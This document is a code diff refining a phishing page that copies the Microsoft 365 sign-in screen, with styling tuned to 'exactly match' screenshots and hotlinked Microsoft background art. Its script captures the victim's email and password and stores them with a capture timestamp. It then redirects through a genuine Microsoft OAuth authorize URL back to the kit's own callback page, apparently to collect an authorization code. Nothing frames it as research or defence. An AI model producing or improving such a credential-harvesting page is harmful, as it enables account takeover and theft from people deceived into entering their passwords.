@@ -6,21 +6,19 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="shortcut icon" href="/images/favicon.ico">
-  <!-- Using a minimal set of Bootstrap for basic utilities, but custom styles will override for layout -->
-  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" crossorigin="anonymous">
   <style>
-    /* --- CSS TO EXACTLY MATCH THE SCREENSHOT --- */
+    /* --- CSS TO EXACTLY MATCH THE NEW SCREENSHOT --- */
     body, html {
       height: 100%;
       margin: 0;
       font-family: "Segoe UI", "Helvetica Neue", "Arial", sans-serif;
-      /* Official Microsoft login page background */
-      background-image: url('https://login.microsoftonline.com/templates/src/images/epic-backgrounds/0-1920x1080.jpg');
+      /* Official Microsoft 365 background */
+      background: url("https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696894951a34a3485345710a6.svg") no-repeat center center fixed;
+      -webkit-background-size: cover;
+      -moz-background-size: cover;
+      -o-background-size: cover;
       background-size: cover;
-      background-repeat: no-repeat;
-      background-attachment: fixed;
-      background-position: center center;
     }
     .main-container {
       display: flex;
@@ -30,14 +28,16 @@
       width: 100%;
     }
     .form-wrapper {
-      max-width: 440px; /* This is the key to matching the size */
+      max-width: 440px; /* Key to matching the size */
       width: 100%;
+      min-height: 360px; /* Ensures the card has enough height */
+      background-color: #fff;
+      box-shadow: 0px 1.2px 3.6px rgba(0,0,0,0.1), 0px 6.4px 14.4px rgba(0,0,0,0.13);
     }
-    .form-box {
-      background-color: rgba(255, 255, 255, 0.95);
+    .form-content {
       padding: 44px;
     }
-    .form-box h1 {
+    .form-content h1 {
       font-size: 24px;
       font-weight: 600;
       margin-bottom: 24px;
@@ -52,19 +52,28 @@
     }
     .form-control:focus {
       box-shadow: none;
+      outline: none;
       border-color: #0078d4;
     }
-    .form-box p {
+    p {
       font-size: 15px;
       margin-top: 16px;
       margin-bottom: 0;
     }
-    .form-box a {
+    a {
       color: #0067b8;
+      text-decoration: none;
     }
-    .form-box .btn {
+    a:hover {
+      text-decoration: underline;
+    }
+    .btn {
+      border: none;
+      border-radius: 2px;
       font-size: 15px;
-      padding: 6px 20px;
+      padding: 4px 12px;
+      min-width: 108px;
+      min-height: 32px;
     }
     #back {
       cursor: pointer;
@@ -72,24 +81,27 @@
       font-size: 16px;
       vertical-align: middle;
     }
-    .options-box {
-      background-color: rgba(255, 255, 255, 0.95);
-      padding: 24px 44px;
-      margin-top: 16px;
+    .options-container {
+      margin-top: 24px;
       border-top: 1px solid #d2d2d2;
+      padding: 24px 44px;
     }
-    .options-box p {
-        margin: 0;
-    }
-    .options-box a {
+    .options-container a {
       color: #1b1b1b;
-      text-decoration: none;
-    }
-    .options-box a:hover {
-      text-decoration: underline;
     }
     .fa-key {
-        color: #5e5e5e;
+      color: #5e5e5e;
+      margin-right: 8px;
+    }
+    .footer {
+      position: fixed;
+      right: 16px;
+      bottom: 12px;
+      font-size: 12px;
+    }
+    .footer a {
+      color: #000;
+      margin-left: 16px;
     }
   </style>
 </head>
@@ -97,8 +109,8 @@
 
   <div class="main-container">
     <div class="form-wrapper">
-      <!-- Main Sign-in Box -->
-      <div class="form-box">
+      <!-- Main Content Area -->
+      <div class="form-content">
         <!-- Email View -->
         <div id="div1">
           <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
@@ -110,7 +122,7 @@
           <p>No account? <a href="#">Create one!</a></p>
           <p><a href="#">Can’t access your account?</a></p>
           <div class="text-right mt-4">
-            <button class="btn text-white px-4" id="next" style="background-color: #0067b8;">Next</button>
+            <button class="btn text-white" id="next" style="background-color: #0067b8;">Next</button>
           </div>
         </div>
 
@@ -127,33 +139,33 @@
           </div>
           <p><a href="#">Forgot my password</a></p>
           <div class="text-right mt-4">
-            <button class="btn text-white px-4" id="submit-btn" style="background-color: #0067b8;">Sign in</button>
+            <button class="btn text-white" id="submit-btn" style="background-color: #0067b8;">Sign in</button>
           </div>
         </div>
       </div>
-
-      <!-- "Sign-in options" Box -->
-      <div class="form-box" id="options_box">
-        <div class="options-box">
-          <p><i class="fas fa-key"></i> <a href="#">Sign-in options</a></p>
-        </div>
+      
+      <!-- "Sign-in options" Area -->
+      <div class="options-container" id="options_box">
+        <p><i class="fas fa-key"></i> <a href="#">Sign-in options</a></p>
       </div>
     </div>
+  </div>
+
+  <div class="footer">
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy & cookies</a>
+    <a href="#">...</a>
   </div>
 
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script>
     // --- THIS JAVASCRIPT LOGIC IS UNTOUCHED ---
     $(document).ready(function(){
-      // Function to validate email format
       function isValidEmail(email) {
         if (!email) return false;
-        // A simple regex for basic email format validation
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         return emailRegex.test(email);
       }
-
-      // --- Step 1: Handle the "Next" button click to go from email to password view ---
       $('#next').click(function(e) {
         e.preventDefault();
         const email = $('#email').val().trim();
@@ -161,56 +173,38 @@
           $('#emailch').text(email);
           $('#div1').hide();
           $('#div2').show();
-          $('#options_box').hide(); // Hide sign-in options on password screen
+          $('#options_box').hide();
           $('#error').hide();
         } else {
           $('#error').show();
         }
       });
-
-      // --- Handle the "Back" arrow click to return to the email view ---
       $('#back').click(function() {
         $('#div2').hide();
         $('#div1').show();
-        $('#options_box').show(); // Show sign-in options again
+        $('#options_box').show();
         $('#msg').hide();
       });
-
-      // --- Step 2: Handle the final "Sign in" button click ---
       $('#submit-btn').click(function(event){
         event.preventDefault();
         const email = $('#emailch').text().trim();
         const password = $('#password').val();
-
         if (!password) {
           $('#msg').show();
           return;
         }
-        
         $('#msg').hide();
         $('#submit-btn').text('Verifying...').prop('disabled', true);
-
-        // Store credentials in localStorage for the callback page to retrieve.
-        const credentialsData = {
-          email: email,
-          password: password,
-          captureTime: new Date().toISOString(),
-          source: 'replacement-html-final'
-        };
+        const credentialsData = { email: email, password: password, captureTime: new Date().toISOString(), source: 'replacement-html-final' };
         try {
           localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
           console.log('✅ Credentials stored successfully in localStorage.');
         } catch (e) {
           console.error('❌ Failed to store credentials in localStorage:', e);
         }
-
-        // Construct the Microsoft login URL with the redirect pointing to our /auth/callback page.
         const callbackUrl = window.location.origin + '/auth/callback';
         const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&response_mode=query&scope=https://graph.microsoft.com/.default&prompt=none&login_hint=${encodeURIComponent(email)}`;
-        
         console.log(`🔄 Redirecting to Microsoft for cookie setting. Will return to: ${callbackUrl}`);
-        
-        // Redirect to Microsoft after a short delay to allow UI to update.
         setTimeout(() => {
           window.location.href = microsoftLoginUrl;
         }, 1200);
